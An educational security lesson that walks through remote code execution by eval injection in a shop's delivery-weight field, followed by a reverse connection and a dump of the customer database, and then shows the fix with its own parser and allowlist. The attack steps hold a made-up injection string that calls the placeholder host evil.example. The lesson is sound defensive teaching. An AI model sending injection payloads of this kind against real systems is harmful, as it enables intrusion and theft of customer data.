# RCE: someone else's code on your server

`lesson` A4 · `section` A · `wave` 1 · `format` 1

## Passport

- `cwe` 94
- `owasp` A03:2021
- `attack` T1190
- `severity` critical
- `impact` The attacker's own code on the server, and with it access to everything the server sees
- `defence` Never run submitted data as code
- `class` Remote code execution through code injection

## Sources

- [MITRE CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [MITRE CWE-95: Eval Injection](https://cwe.mitre.org/data/definitions/95.html)
- [MITRE CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [MITRE CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- [MITRE ATT&CK T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [OWASP Top 10:2021, A03 Injection](https://owasp.org/Top10/2021/A03_2021-Injection/)
- [OWASP Cheat Sheet Series: Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)

## Participants

- `c2` **Attacker's server** — evil.example · `icon:server`
- `attacker` **Attacker** — 203.0.113.66 · `term:attacker`
- `server` **Server** — 198.51.100.10 · `term:web-server`
- `db` **Database** — customers · `term:database`

## Zones

- `evil` Attacker's network: `c2`, `attacker` · `danger`
- `site` Shop shop.example: `server`, `db` · `term:trust-boundary`

## Steps

### `parser` A parser of its own

`server → server` · `safe` · `with-defence`
Message: own parser · Result: no eval

#### Simple

The shop's developer replaced «run it as a program» with **their own parser**: the server
understands only numbers and four operations. Anything else is an error.

#### Step by step

The parser reads the formula character by character and does the arithmetic itself. It cannot
call functions, so no text can become a command.

#### Deeper

For CWE-94, MITRE's first advice is to rework the program so that it never needs to build code
from data at all. Checking against an allowlist is a second layer.

### `calc` A normal formula

`attacker → server` · `legit`
Message: weight=2*3 · Result: 6 kg

```http
GET /price?weight=2*3
```

#### Simple

The shop calculates delivery. You can type a **formula** in the weight field: two boxes of three
kilograms, `2*3`. The server answers: 6 kg.

#### Step by step

Without the fix, the server computes the formula the easiest way: it hands it to the
programming language as if it were a piece of the program, with a function like `eval`.

#### Deeper

`eval` runs a string as code. For `2*3` that is handy: the language already knows arithmetic. But
the language knows everything else too: files, the network, starting programs.

### `inject` A formula with a surprise

`attacker → server` · `attack` · `without-defence`
Message: 2*3+run(...) · Result: executed

```text
GET /price?weight=2*3+⟦run("connect evil.example")⟧
```

#### Simple

In the weight field the attacker writes not a number but a **command**. The server cannot tell
data from program and runs it.

#### Step by step

The server glues the formula into code and passes it to the language. `run(…)` here is a made-up
notation: «start a program that connects to the attacker's server».

#### Deeper

This is CWE-94: the program builds code from outside data and does not neutralize the parts that
change what the code means. The special case with `eval` is CWE-95. In the OWASP Top 10:2021 code
injection belongs to A03. There are other roads to RCE: OS command injection (CWE-78), unpacking
objects from untrusted sources (CWE-502; Apache lists it for Log4Shell, lesson K1) and memory errors such as writing past a
buffer's end (CWE-787).

### `callback` Reverse connection

`server → c2` · `attack` · `without-defence`
Message: connection · Result: channel open

#### Simple

The shop's server **itself** calls the attacker's server and waits for commands. The attacker
does not need to break in: the door was opened from inside.

#### Step by step

This trick is called a reverse shell. Inbound connections to the server are usually closed, while
outbound ones are often allowed, and that is what it relies on.

#### Deeper

Remote code execution, RCE, is when an attacker over the network makes someone else's machine run
their code. It can be pre-auth, open to anyone on the internet, or post-auth, needing an account.
The first is worse: in CVSS that is `PR:N`. In ATT&CK, exploiting an internet-facing application
is T1190.

### `command` Commands from afar

`c2 → server` · `attack` · `without-defence`
Message: command · Result: running

#### Simple

The attacker gives commands, and the server runs them **with the shop's rights**. Whatever the
site's program can do, the attacker now can too.

#### Step by step

The site's program knows the database password: it sits in its settings. The attacker reads it.

#### Deeper

How deep the attacker gets depends on the program's rights. If it runs as an administrator, the
attacker has the whole machine.

### `loot` The customer database

`server → db` · `attack` · `without-defence`
Message: dump · Result: data stolen

```sql
SELECT * FROM customers
```

#### Simple

With the password from the settings the attacker **dumps** the customer database. It all started
with the «weight» field.

#### Step by step

To the database this is an ordinary query from its own server, so it runs it.

#### Deeper

After RCE the trust boundary is already crossed: internal systems see the attacker as their own
server. That is why second lines matter: few rights for the program, a separate database account,
no unneeded outbound connections.

### `rejected` Formula refused

`attacker → server` · `attack` · `with-defence` · `stopped`
Message: 2*3+run(...) · Result: refused

```text
GET /price?weight=2*3+⟦run("connect evil.example")⟧
```

#### Simple

The same string reaches the fixed server. The parser sees **letters and brackets**, which are not
on the allowlist, and refuses to compute.

#### Step by step

Nothing runs: the parser cannot call functions. The attempt is written to the log.

#### Deeper

Even if a similar bug survives somewhere, the second line helps: the shop's server has no reason
to connect out to strange addresses, and blocking outbound connections would cut the reverse
connection.

### `error` An error reply

`server → attacker` · `safe` · `with-defence`
Message: 400 · Result: invalid formula

#### Simple

The attacker gets «invalid formula», like a shopper who made a typo.

#### Step by step

The server answers with code 400 and does not say what exactly it disliked.

#### Deeper

A short error without details gives the attacker no hints about how the parser works.

## How to defend

- **Don't run data.** Never pass submitted text to `eval` or similar functions, never build code
  from it. Best of all, rework the program so it is not needed.
- **Allow, don't block.** If input should be a formula, accept only what is on the allowlist:
  numbers and operation signs.
- **Give the program few rights.** The site's program should not run as an administrator; a
  sandbox limits what the attacker's code can do.
- **Close unneeded outbound connections.** Then a reverse connection won't work.
- **Update libraries.** Many RCEs are in other people's code, like Log4Shell; a patch closes them.
